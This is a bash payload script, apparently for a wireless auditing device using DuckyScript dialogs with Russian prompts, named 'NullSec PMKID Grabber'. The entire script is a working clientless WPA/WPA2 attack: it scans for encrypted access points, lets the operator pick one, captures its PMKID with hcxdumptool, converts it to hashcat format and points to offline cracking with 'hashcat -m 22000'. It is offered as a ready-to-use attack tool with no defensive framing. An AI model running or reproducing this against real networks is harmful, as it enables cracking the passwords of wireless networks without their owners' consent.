#!/bin/bash
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
# Title: NullSec PMKID Grabber
# Author: bad-antics
# Description: Clientless WPA/WPA2 attack using PMKID from first EAPOL message
# Category: nullsec

LOOT_DIR="/mmc/nullsec/captures"
mkdir -p "$LOOT_DIR"

PROMPT "ПЕРЕХВАТЧИК PMKID
━━━━━━━━━━━━━━━━━━━━━━━━━
Бесшумная WPA-атака.
Переделяет PMKID от точки
без ожидания рукопожатия.

Нажмите OK для сканирования."

MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && ERROR_DIALOG "Нет интерфейса монитора!" && exit 1

# Check for hcxdumptool
if ! which hcxdumptool >/dev/null 2>&1; then
    ERROR_DIALOG "hcxdumptool не найден!\nУстановите: opkg install hcxdumptool"
    exit 1
fi

SPINNER_START "Сканирование целей..."
rm -f /tmp/pmkid_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/pmkid_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

declare -a TARGETS CHANS NAMES
idx=0
while IFS=',' read -r bssid x1 x2 channel x3 cipher auth power x4 x5 x6 x7 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    cipher=$(echo "$cipher" | tr -d ' ')
    echo "$cipher" | grep -qi "CCMP\|TKIP" || continue
    essid=$(echo "$essid" | tr -d ' ' | head -c 16)
    [ -z "$essid" ] && essid="[Hidden]"
    TARGETS[$idx]="$bssid"
    CHANS[$idx]=$(echo "$channel" | tr -d ' ')
    NAMES[$idx]="$essid"
    idx=$((idx + 1))
    [ $idx -ge 8 ] && break
done < /tmp/pmkid_scan-01.csv

[ $idx -eq 0 ] && ERROR_DIALOG "WPA-цели не найдены!" && exit 1

PROMPT "WPA-цели: $idx

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${NAMES[$i]}"; done)

Выберите номер цели."

SEL=$(NUMBER_PICKER "Цель (1-$idx):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
SEL=$((SEL - 1))
[ $SEL -lt 0 ] && SEL=0
[ $SEL -ge $idx ] && SEL=$((idx - 1))

TARGET_BSSID="${TARGETS[$SEL]}"
TARGET_CH="${CHANS[$SEL]}"
TARGET_NAME="${NAMES[$SEL]}"
OUTFILE="$LOOT_DIR/pmkid_${TARGET_NAME}_$(date +%Y%m%d_%H%M%S)"

resp=$(CONFIRMATION_DIALOG "Атака PMKID на:\n${TARGET_NAME}\n\nМожет занять 1-2 минуты.\nПродолжить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Перехват PMKID..."
iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null
timeout 120 hcxdumptool -i "$MONITOR_IF" --filterlist_ap="$TARGET_BSSID" --filtermode=2 -o "${OUTFILE}.pcapng" 2>/dev/null
SPINNER_STOP

if [ -f "${OUTFILE}.pcapng" ] && [ -s "${OUTFILE}.pcapng" ]; then
    hcxpcapngtool "${OUTFILE}.pcapng" -o "${OUTFILE}.22000" 2>/dev/null
    PMKID_COUNT=$(wc -l < "${OUTFILE}.22000" 2>/dev/null || echo "0")
    PROMPT "PMKID ПЕРЕХВАЧЕН!
━━━━━━━━━━━━━━━━━━━━━━━━━
Цель: $TARGET_NAME
PMKID: $PMKID_COUNT
Файл: $(basename ${OUTFILE})

Взлом через hashcat:
hashcat -m 22000"
else
    PROMPT "PMKID НЕ ПЕРЕХВАЧЕН
━━━━━━━━━━━━━━━━━━━━━━━━━
Цель может не поддерживать
PMKID. Используйте захват
рукопожатия вместо этого."
fi
